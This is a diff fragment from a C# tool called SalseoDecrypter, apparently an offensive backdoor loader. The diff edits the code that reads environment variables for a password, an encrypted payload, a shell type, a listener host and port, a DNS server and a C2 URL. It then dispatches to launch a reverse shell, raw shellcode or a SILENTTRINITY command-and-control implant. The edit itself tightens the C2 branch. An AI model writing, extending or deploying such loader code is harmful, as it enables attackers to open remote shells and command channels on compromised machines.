@@ -91,8 +91,8 @@ namespace SalseoDecrypter
             if ((Environment.GetEnvironmentVariable("LPORT")) != null) { varlport = Environment.GetEnvironmentVariable("LPORT"); } else { };
             if ((Environment.GetEnvironmentVariable("DNSSERVER")) != null) { vardnsserver = Environment.GetEnvironmentVariable("DNSSERVER"); } else { };
 	    if ((Environment.GetEnvironmentVariable("URL_C2C")) != null) { url_c2c = Environment.GetEnvironmentVariable("URL_C2C"); } else { };
-	    if (varpass != null & varpayload !=null & url_c2c.ToLower() !=null ) {string[] argumentos = {varpass, varpayload, url_c2c}; Main(argumentos); };
-	    if (varpass != null & varpayload !=null & varshell.ToLower() == "shellcode" ) {string[] argumentos = {varpass, varpayload, varshell}; Main(argumentos); };
+	    if (varpass != null & varpayload != null & url_c2c != null & varshell.ToLower() == "silenttrinity") { string[] argumentos = { varpass, varpayload, varshell, url_c2c }; Main(argumentos); };
+            if (varpass != null & varpayload !=null & varshell.ToLower() == "shellcode" ) {string[] argumentos = {varpass, varpayload, varshell}; Main(argumentos); };
             if (varpass != null & varpayload != null & varshell != null & varlhost != null & vardnsserver == null) { string[] argumentos = { varpass, varpayload, varshell, varlhost, varlport }; Main(argumentos); };
             if (varpass != null & varpayload != null & varshell != null & varlhost != null & vardnsserver != null) { string[] argumentos = { varpass, varpayload, varshell, varlhost, vardnsserver}; Main(argumentos); };
 
